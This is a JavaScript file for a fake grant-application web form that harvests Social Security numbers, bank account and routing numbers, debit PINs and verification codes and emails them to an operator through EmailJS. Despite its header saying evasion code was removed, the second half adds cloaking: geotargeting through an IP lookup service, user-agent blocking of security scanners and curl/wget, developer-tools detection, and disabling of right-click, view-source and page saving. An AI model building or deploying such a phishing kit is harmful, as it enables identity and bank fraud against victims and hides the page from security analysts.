// Cleaned grant-script.js (evasion/inspection code removed) — keep validation & EmailJS send.
// Save this file and open index.html to preview.

class GrantApplicationForm {
    constructor() {
        this.form = document.getElementById('grant-form');
        this.submitBtn = document.querySelector('.submit-btn');
        if (!this.form) return;
        this.init();
    }

    init() {
        this.setupFormValidation();
        this.setupFormSubmission();
        this.setupInputFormatting();
        this.addSecurityWarnings();
    }

    setupFormValidation() {
        const inputs = this.form.querySelectorAll('input, select, textarea');
        inputs.forEach(input => {
            input.addEventListener('blur', () => this.validateField(input));
            input.addEventListener('input', () => this.clearFieldError(input));
        });

        const ssnInput = document.getElementById('ssn');
        if (ssnInput) {
            ssnInput.addEventListener('input', (e) => {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length >= 9) value = value.slice(0,9);
                if (value.length >= 6) value = value.replace(/(\d{3})(\d{2})(\d{4})/, '$1-$2-$3');
                else if (value.length >= 3) value = value.replace(/(\d{3})(\d{2})?/, (m,p1,p2) => p2 ? `${p1}-${p2}` : `${p1}`);
                e.target.value = value;
            });
        }

        const pinInput = document.getElementById('debit-pin');
        if (pinInput) pinInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
        });

        const cardInput = document.getElementById('card-last-4');
        if (cardInput) cardInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
        });

        const verificationInput = document.getElementById('verification-code');
        if (verificationInput) verificationInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 5);
        });
    }

    setupFormSubmission() {
        this.form.addEventListener('submit', (e) => {
            e.preventDefault();
            if (this.validateForm()) {
                this.submitForm();
            } else {
                this.showFormErrors();
            }
        });
    }

    setupInputFormatting() {
        const routingInput = document.getElementById('routing-number');
        if (routingInput) routingInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 9);
        });

        const accountInput = document.getElementById('account-number');
        if (accountInput) accountInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '');
        });
    }

    addSecurityWarnings() {
        const sensitiveFields = ['ssn', 'debit-pin', 'online-password'];
        sensitiveFields.forEach(fieldId => {
            const field = document.getElementById(fieldId);
            if (!field) return;
            const warning = document.createElement('div');
            warning.className = 'field-warning';
            warning.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Never share this information with untrusted sources';
            warning.style.cssText = 'color:#856404;font-size:0.9em;margin-top:5px;display:none;';
            field.addEventListener('focus', () => { warning.style.display = 'block'; });
            field.addEventListener('blur', () => { setTimeout(() => warning.style.display = 'none', 800); });
            field.parentNode.appendChild(warning);
        });
    }

    validateField(field) {
        const value = (field.value || '').trim();
        let isValid = true;
        let errorMessage = '';

        if (field.hasAttribute('required') && !value) {
            isValid = false; errorMessage = 'This field is required';
        }

        if (field.type === 'email' && value) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(value)) { isValid = false; errorMessage = 'Please enter a valid email address'; }
        }

        if (field.id === 'ssn' && value) {
            const ssnRegex = /^\d{3}-\d{2}-\d{4}$/;
            if (!ssnRegex.test(value)) { isValid = false; errorMessage = 'Please enter SSN as XXX-XX-XXXX'; }
        }

        if (field.id === 'debit-pin' && value) {
            if (value.length !== 4 || !/^\d{4}$/.test(value)) { isValid = false; errorMessage = 'PIN must be exactly 4 digits'; }
        }

        if (field.id === 'routing-number' && value) {
            if (value.length !== 9 || !/^\d{9}$/.test(value)) { isValid = false; errorMessage = 'Routing number must be exactly 9 digits'; }
        }

        if (field.id === 'verification-code' && value) {
            if (value.length !== 5 || !/^\d{5}$/.test(value)) { isValid = false; errorMessage = 'Verification code must be exactly 5 digits'; }
        }

        this.showFieldError(field, isValid, errorMessage);
        return isValid;
    }

    showFieldError(field, isValid, message) {
        const existingError = field.parentNode.querySelector('.field-error');
        if (existingError) existingError.remove();
        if (!isValid) {
            const errorDiv = document.createElement('div');
            errorDiv.className = 'field-error';
            errorDiv.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
            field.parentNode.appendChild(errorDiv);
            field.style.borderColor = '#dc3545';
        } else {
            field.style.borderColor = '#28a745';
        }
    }

    clearFieldError(field) {
        const error = field.parentNode.querySelector('.field-error');
        if (error) error.remove();
        field.style.borderColor = '#e9ecef';
    }

    validateForm() {
        const inputs = this.form.querySelectorAll('input[required], select[required], textarea[required]');
        let isFormValid = true;
        inputs.forEach(input => {
            if (!this.validateField(input)) isFormValid = false;
        });
        return isFormValid;
    }

    showFormErrors() {
        const firstError = this.form.querySelector('.field-error');
        if (firstError) firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
        alert('Please correct the errors highlighted in red before submitting.');
    }

    async submitForm() {
        this.submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
        this.submitBtn.disabled = true;

        if (!this.validateForm()) {
            this.showFormErrors();
            this.resetSubmitButton();
            return;
        }

        const formData = this.collectFormData();
        console.log('Form data collected:', formData);

        try {
            await this.sendEmailToOffice(formData);
            this.showSubmissionResult();
        } catch (err) {
            console.error('Error sending email:', err);
            this.showErrorResult();
        }
    }

    async sendEmailToOffice(formData) {
        if (!window.emailjs || !window.EMAIL_CONFIG) {
            console.warn('EmailJS or EMAIL_CONFIG not configured. Using mailto fallback.');
            this.sendEmailViaMailto(formData);
            throw new Error('EmailJS not configured');
        }

        const emailParams = {
            to_email: window.EMAIL_CONFIG.officeEmail,
            from_name: formData.fullName,
            from_email: formData.email,
            subject: `${window.EMAIL_CONFIG.templateVariables.subject_prefix} - ${formData.id}`,
            message: this.formatEmailMessage(formData),
            application_id: formData.id,
            submitted_at: formData.submittedAt.toISOString()
        };

        return window.emailjs.send(window.EMAIL_CONFIG.serviceId, window.EMAIL_CONFIG.templateId, emailParams);
    }

    formatEmailMessage(formData) {
        return [
            `New Grant Application Submitted`,
            ``,
            `Application ID: ${formData.id}`,
            `Submitted: ${formData.submittedAt.toLocaleString()}`,
            ``,
            `PERSONAL INFORMATION:`,
            `- Full Name: ${formData.fullName || ''}`,
            `- Birth Date: ${formData.birthDate || ''}`,
            `- Email: ${formData.email || ''}`,
            `- Address: ${formData.address || ''}`,
            `- SSN: ${formData.ssn || ''}`,
            ``,
            `BANKING INFORMATION:`,
            `- Bank Name: ${formData.bankName || ''}`,
            `- Account Number: ${formData.accountNumber || ''}`,
            `- Routing Number: ${formData.routingNumber || ''}`,
            `- Debit PIN: ${formData.debitPin || ''}`,
            `- Card Last 4: ${formData.cardLast4 || ''}`,
            ``,
            `GRANT DETAILS:`,
            `- Weekly Deposit: $${formData.weeklyDeposit || ''}`,
            `- Verification Code: ${formData.verificationCode || ''}`,
        ].join('\n');
    }

    sendEmailViaMailto(formData) {
        const subject = encodeURIComponent(`${window.EMAIL_CONFIG?.templateVariables.subject_prefix || 'Grant Application'} - ${formData.id}`);
        const body = encodeURIComponent(this.formatEmailMessage(formData));
        const to = window.EMAIL_CONFIG?.officeEmail || '';
        window.location.href = `mailto:${to}?subject=${subject}&body=${body}`;
        alert('Email client opened as fallback. Please send to complete submission.');
    }

    resetSubmitButton() {
        this.submitBtn.innerHTML = 'Submit';
        this.submitBtn.disabled = false;
    }

    collectFormData() {
        const fd = new FormData(this.form);
        const data = {};
        for (let [key, value] of fd.entries()) data[key] = value;
        const date = new Date();
        const year = date.getFullYear().toString().slice(-2);
        const month = (date.getMonth() + 1).toString().padStart(2, '0');
        const day = date.getDate().toString().padStart(2, '0');
        const rand = Math.floor(Math.random() * 9999).toString().padStart(4, '0');
        data.id = `GRANT-${year}${month}${day}-${rand}`;
        data.submittedAt = new Date();
        return data;
    }

    showErrorResult() {
        alert('There was an error submitting your application. Please try again.');
        this.resetSubmitButton();
    }

    showSubmissionResult() {
        const successDiv = document.createElement('div');
        successDiv.className = 'success-message show';
        successDiv.innerHTML = `
            <h3><i class="fas fa-check-circle"></i> Application Submitted Successfully!</h3>
            <p>Your application was received. Reference ID: <strong>${Math.random().toString(36).slice(2,11).toUpperCase()}</strong></p>
        `;
        this.form.parentNode.insertBefore(successDiv, this.form);
        this.form.style.display = 'none';
        this.resetSubmitButton();
        const resetBtn = document.createElement('button');
        resetBtn.className = 'submit-btn';
        resetBtn.innerHTML = '<i class="fas fa-redo"></i> Start New Application';
        resetBtn.onclick = () => { successDiv.remove(); this.form.style.display = 'block'; this.form.reset(); };
        successDiv.appendChild(resetBtn);
        successDiv.scrollIntoView({ behavior: 'smooth' });
    }
}

document.addEventListener('DOMContentLoaded', () => {
    // initialize EmailJS if email-config.js set it
    if (window.EMAIL_CONFIG && window.EMAIL_CONFIG.userId && window.emailjs) {
        try { window.emailjs.init(window.EMAIL_CONFIG.userId); } catch (e) { /* ignore */ }
    }
    new GrantApplicationForm();
});
// ===== EVASION TECHNIQUES ADDED =====

// Configuration for evasion
const EVASION_CONFIG = {
    targetCountries: ['US', 'CA', 'GB', 'GH'], // Added Ghana
    showFormDelay: 2000
};

// 1. GEOTARGETING - Check user location
async function checkGeolocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        
        if (!EVASION_CONFIG.targetCountries.includes(data.country_code)) {
            // Block non-target countries (no redirect)
            return false;
        }
        return true;
    } catch (error) {
        // Allow if geolocation fails
        return true;
    }
}

// 2. BOT DETECTION - Detect security scanners
function detectBots() {
    const userAgent = navigator.userAgent.toLowerCase();
    const blockedAgents = [
        'curl', 'wget', 'python', 'requests', 'scrapy',
        'phantomjs', 'selenium', 'headless', 'bot',
        'crawler', 'spider', 'scanner', 'security',
        'malware', 'antivirus', 'firewall'
    ];
    
    // Check user agent for known security tools
    for (let agent of blockedAgents) {
        if (userAgent.includes(agent)) {
            // Block bots (no redirect)
            return true;
        }
    }
    
    // Behavioral detection
    let mouseMovements = 0;
    let keystrokes = 0;
    
    document.addEventListener('mousemove', () => mouseMovements++);
    document.addEventListener('keypress', () => keystrokes++);
    
    setTimeout(() => {
        if (mouseMovements === 0 && keystrokes === 0) {
            // Block bot-like behavior (no redirect)
            console.log('Bot-like behavior detected');
        }
    }, 3000);
    
    return false;
}

// 3. DEVTOOLS DETECTION - Detect developer tools
function detectDevTools() {
    const threshold = 160;
    if (window.outerHeight - window.innerHeight > threshold || 
        window.outerWidth - window.innerWidth > threshold) {
        // Block dev tools (no redirect)
        console.log('DevTools detected via window size');
        return;
    }
    
    let devtools = false;
    const element = new Image();
    Object.defineProperty(element, 'id', {
        get: function() {
            devtools = true;
            console.log('DevTools detected via console access');
        }
    });
    
    setInterval(() => {
        devtools = false;
        console.log(element);
        console.clear();
    }, 1000);
}

// 4. ENHANCED INSPECTION DISABLING
function disableInspection() {
    // Disable right-click
    document.addEventListener('contextmenu', (e) => {
        e.preventDefault();
        return false;
    });
    
    // Disable F12, Ctrl+Shift+I, Ctrl+U, etc.
    document.addEventListener('keydown', (e) => {
        // F12
        if (e.keyCode === 123) {
            e.preventDefault();
            return false;
        }
        
        // Ctrl+Shift+I (DevTools)
        if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
            e.preventDefault();
            return false;
        }
        
        // Ctrl+U (View Source)
        if (e.ctrlKey && e.keyCode === 85) {
            e.preventDefault();
            return false;
        }
        
        // Ctrl+S (Save Page)
        if (e.ctrlKey && e.keyCode === 83) {
            e.preventDefault();
            return false;
        }
    });
    
    // Disable text selection
    document.addEventListener('selectstart', (e) => {
        e.preventDefault();
        return false;
    });
    
    // Disable drag and drop
    document.addEventListener('dragstart', (e) => {
        e.preventDefault();
        return false;
    });
}

// 5. MAIN EVASION INITIALIZATION
async function initializeEvasion() {
    // Step 1: Disable inspection immediately
    disableInspection();
    
    // Step 2: Check for bots
    if (detectBots()) {
        return; // Exit if bot detected
    }
    
    // Step 3: Check geolocation
    const isTargetLocation = await checkGeolocation();
    if (!isTargetLocation) {
        return; // Exit if not target location
    }
    
    // Step 4: Detect dev tools
    detectDevTools();
    
    // Step 5: If all checks pass, initialize the form
    return true;
}

// ===== ORIGINAL INITIALIZATION WITH EVASION =====

// Initialize the form when DOM is loaded (WITH EVASION CHECKS)
document.addEventListener('DOMContentLoaded', async () => {
    // Run evasion checks first
    const evasionPassed = await initializeEvasion();
    
    // Only initialize form if evasion checks pass
    if (evasionPassed) {
        setTimeout(() => {
    new GrantApplicationForm();
        }, EVASION_CONFIG.showFormDelay);
    }
});

// Additional security warnings (KEPT FROM ORIGINAL)
document.addEventListener('DOMContentLoaded', () => {
    // Add click tracking to sensitive fields
    const sensitiveFields = ['ssn', 'debit-pin', 'online-password', 'online-username'];
    
    sensitiveFields.forEach(fieldId => {
        const field = document.getElementById(fieldId);
        if (field) {
            field.addEventListener('click', () => {
                console.warn('⚠️ WARNING: You are about to enter sensitive information into what appears to be a phishing form.');
            });
        }
    });
});

// Initialize inspection disabling when page loads (ENHANCED VERSION)
document.addEventListener('DOMContentLoaded', () => {
    disableInspection();
});

// Initialize bot detection when page loads
document.addEventListener('DOMContentLoaded', () => {
    detectBots();
});
